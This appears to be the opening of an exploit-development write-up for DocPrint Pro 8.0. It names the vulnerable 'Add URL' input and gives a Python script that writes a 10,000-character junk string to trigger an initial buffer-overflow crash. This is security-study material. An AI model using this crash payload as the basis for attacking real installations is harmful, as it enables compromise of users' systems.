# DocPrint Pro 8.0

Downloaded from: https://www.exploit-db.com/exploits/49100: https://www.exploit-db.com/apps/560e231d212fdaef8e52471f94a5f014-docprint_pro_setup.exe![immagine](https://user-images.githubusercontent.com/59916156/194383567-66a4b359-e467-4215-8189-874d4a4ce3cc.png)

Vulnerable function: File -> Add URL

## Initial Crash
```py
#!/usr/bin/python 

file = "file.txt"
f = open(file , "w")

CRASH_LEN = 10000  # change me

junk = "A" * CRASH_LEN
f.write(junk)
f.close()
```
